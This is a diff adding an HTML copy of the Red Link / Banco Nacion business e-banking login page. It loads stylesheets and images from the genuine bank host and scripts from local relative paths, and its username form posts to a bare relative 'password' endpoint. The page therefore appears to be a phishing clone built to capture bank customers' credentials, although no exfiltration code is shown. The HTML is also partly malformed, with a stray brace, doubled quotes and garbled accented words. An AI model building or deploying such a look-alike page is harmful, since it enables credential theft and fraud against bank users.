@@ -1,0 +1,261 @@
+
+<html>
+ <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=latin1" /> 
+  <!-- <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8"/> -->
+  <title>Red Link</title>
+  
+  <link rel="icon" type="image/png" href="bna2/banco/producto/imagenes/common/icons/favicon.ico" />
+
+  <link href="https://bee.redlink.com.ar/bna2/banco/producto/css/login.css" rel="stylesheet" type="text/css"/>
+
+  <script type="text/javascript" src="bna2/bibliotecas/js/inputValidators.js" ></script>
+
+  <script type="text/javascript" src="bibliotecas/js/main_opbee.js"></script>
+  
+  
+
+
+	<link rel="stylesheet" type="text/css" href="https://bee.redlink.com.ar/bna2/banco/producto/css/jqModal.css"/>
+
+
+	
+  	<script type="text/javascript" src="bibliotecas/js/jquery/jquery-1.4.2.min.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/jquery.hoverIntent.minified.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/menu/jquery.megamenu.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/menu/jquery.acordeon2.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/keyboard/jquery.keypad.js" ></script>
+	<script type="text/javascript" src="bibliotecas/js/tecladoVirtual.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/form/jquery.form.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/validate/jquery.validate.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/ajax/AjaxSubmitConfiguration.js"></script> 
+	<script type="text/javascript" src="bibliotecas/js/ajax/ajaxController.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/modal/jqModal.js" ></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/ui/jquery-ui-1.8.6.custom.min.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/ui/datepicker.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/jquery/ui/jquery.ui.datepicker-es.js"></script>	
+	<script type="text/javascript" src="bibliotecas/js/jquery/ayuda/jquery.collapse.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/json2.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/unloadFunctions.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/impresionController.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/main_opbee.js"></script>
+	<script type="text/javascript" src="bibliotecas/js/modal.js"></script>
+  
+
+  <script type="text/javascript">
+  	if (top != self) top.location.replace(location); //FrameKiller
+	var date = new Date();
+	var d  = date.getDate();
+	var day = (d < 10) ? '0' + d : d;
+	var m = date.getMonth() + 1;
+	var month = (m < 10) ? '0' + m : m;
+	var yy = date.getYear();
+	var year = (yy < 1000) ? yy + 1900 : yy;
+
+  function validateInput() {
+	  var user = document.getElementById('aliasInput').value;
+	  if (!validateNotEmptyString(user)) {
+		  showMessageError('Por favor, ingrese los datos solicitados.')
+		  return false;
+	  }
+
+	  return true;
+  }
+
+ 
+  }
+ 
+</script>
+
+ </head>
+
+<body>
+	
+	
+	
+	
+
+ 
+
+
+
+<!-- Atributos requeridos -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+
+	
+
+</script>
+
+<div id="tycModaLogin" class="jqmWindow comprobantes" style="min-width:500px"> 
+	<div id ="tycModaLogin_top" class="top" style="padding:10px">
+		<h1 align="left">Terminos y Condiciones</h1>					
+	</div>	
+	<div id ="tycModaLogin_middle" class="middle" style="padding:10px">
+		<div id="tycModaLogin_genericTyC_Content" style="overflow: auto; width: 100%; height: 100%;text-align:justify">
+			<p></p>
+		</div>
+		
+	</div>
+	<div class="bottom" style="padding:10px">
+		<div id="tycModaLogin_acceptCheckBox" style="display:inline; float:left">
+			<input type="checkbox" id="tycModaLogin_tycAcceptCheckbox" onChange="javascript:tycModaLogin_changeCheck()">
+			<label for="tycModaLogin_tycAcceptCheckbox">He leido y acepto los terrminos y condiciones</label>				
+		</div>
+		<div align="right">
+			<a id="tycModaLogin_cancelButton" class="button" onClick="javascript:tycModaLogin_cancelTyC()">Cerrar</a>
+			<a id="tycModaLogin_cerrarButton" class="button" onClick="javascript:tycModaLogin_cerrarInformacionTyc()">Cerrar</a>
+			<a id="tycModaLogin_okButton" class="buttonOff" onClick="javascript:tycModaLogin_acceptTyC()">Aceptar</a>		
+		</div>
+	</div>		
+</div>
+
+<div id="tycModaLogin_divError" class="mensajeError" style="display: none;">
+	<span id="tycModaLogin_spError">&nbsp;</span>
+</div>
+
+<form id="tycModaLogin_aceptTyCFormID" action="/bna2/aceptarTyc.htm" method="post" enctype="multipart/form-data">  <script type="text/javascript">
+  
+  
+    
+  </script>
+
+<input type="hidden" name="_STATE_" value="6-1-4AF86BC47650DCBF1B34B80CB0481D4B">
+</form>
+
+
+
+<div id="bodyLogin" style="display:none;">
+</div>
+
+<div id="ingresoUsuario">
+	<div class="mainContainer">
+		<div class="container">
+	
+			<div class="header">
+				<div id="logoEntidad">
+					<img src="https://bee.redlink.com.ar/bna2/banco/producto/imagenes/common/logos/logo_200.gif" />
+				</div>
+				<div id="logoProducto">
+				</div>			
+			</div>
+	
+			<div class="bandaHeader">
+				<div class="bandaTitle">
+					BANCA ELECTRONICA PARA EMPRESAS
+				</div>
+				<div class="bandaFecha">
+					<script type="text/javascript">document.write(day + " / " + month + " / " + year);</script>
+				</div>
+			</div>
+	
+	    	<div class="content">
+	
+				<div class="col-01">
+				</div>
+	
+				<div class="col-02">
+				</div>
+				
+				<div class="col-03">
+					<div class="bienvenido">
+						Bienvenido a la Banca Electronica para Empresas
+					</div>
+					<div id="divError" class="mensajeError" style="display: none;">
+						<span id="spError">&nbsp;</span>
+					</div>
+					
+
+					
+					<form id="formCargarClave" action="password"" method="post" enctype="multipart/form-data">
+						<div class="preguntasFrecuentes">
+							 <a class="linkLogin">Ingresar por primera vez / Blanqueo de CIU</a>
+						</div>
+					<input type="hidden" name="_STATE_" value="6-3-4AF86BC47650DCBF1B34B80CB0481D4B">
+</form>
+
+					<div id="bloqueLogin" class="loginBEE">
+						
+			      		<form id="formContinuar"  action="password" method="post" enctype="multipart/form-data" onsubmit="return validateInput()">
+						
+						    <table cellpadding="2" cellspacing="2" border="0">
+						    <tr>
+						      <td><label for="alias">Ingrese su usuario:</label></td>
+						      <td>
+									
+									<input id="banco" name="banco" type="hidden" value="11"/>
+									<input id="alias" name="alias" type="text" value="" size="15" autocomplete="off" required/>
+									
+							  </td>
+						      <td>
+						      		
+									<button class="button">Continuar</button>
+						      </td>
+						    </tr>
+						    </table>
+				
+						<input type="hidden" name="_STATE_" value="6-5-4AF86BC47650DCBF1B34B80CB0481D4B">
+</form>
+					</div>
+					
+					<form id="formRecupero" action="/bna2/doLoginRecover.htm?" method="post" enctype="multipart/form-data">
+						<div class="preguntasFrecuentes">								
+							<div class="linkRecuperacion"">
+								
+								
+								<a onclick=";" class="linkLogin">Recuperar Clave</a>
+								
+							</div>
+							<a class="pregLogin" target="_blank" href="bna2/banco/producto/faq/faq.html" >Preguntas Frecuentes</a>
+							
+							
+							
+							<div id="powerbylink" style="display:none;"><img src="https://bee.redlink.com.ar/bna2/banco/producto/imagenes/common/logos/PoweredLink.png"></div>
+					    </div>
+					<input type="hidden" name="_STATE_" value="6-7-4AF86BC47650DCBF1B34B80CB0481D4B">
+</form>
+					
+					<form id="formOlvidoUsuario" action="/bna2/doLoginOlvidoUsuario.htm?" method="post" enctype="multipart/form-data">
+					<input type="hidden" name="_STATE_" value="6-9-4AF86BC47650DCBF1B34B80CB0481D4B">
+</form>
+
+					<div class="importante">
+						<b>Seguridad en operaciones por Home Banking / Banca Electronica;nica para Empresas.</b>
+						<p>Recuerde que esta Entidad no env&iacute;a correos electronica;nicos (email) ni realiza llamados telefono;nicos para solicitar cambio o confirmacion de datos personales (n&uacute;mero de cuenta, nombre de usuario, clave de acceso). Red Link S.A. en ning&uacute;n caso se comunicar&aacute; con Ud. requiri&eacute;ndole este tipo de informaci&oacute;n.</p>
+						<p style="text-align:right">1.627.9</p>
+					</div>
+				</div>
+			</div>
+
+			<div class="footer">
+
+	<script src="bibliotecas/js/JavaScript-Seal-v3.0.js" type="text/javascript"></script>
+	<div style="text-align:right; padding-right: 10px" title='Haga Click para Verificar - Este sitio cuenta con un Certificado SSL de Symantec para asegurar la confidencialidad de sus comunicaciones.'>
+		<a href="javascript:Seal_Certificado('bee.redlink.com.ar', 'es', 'CURS-3.0', 'imagen');">
+			<img src="https://bee.redlink.com.ar/bibliotecas/imagenes/CURS-3.0.png" alt="CertiSur Seal" width="100" height="72" border="0" />
+		</a>
+		<script type="text/javascript" src="https://seal.websecurity.norton.com/getseal?host_name=bee.redlink.com.ar&amp;size=S&amp;use_flash=NO&amp;use_transparent=YES&amp;lang=es"></script>
+	</div>
+	
+</div>
+
+	
+		</div>
+	</div>
+</div> 
+</body>
+</html>
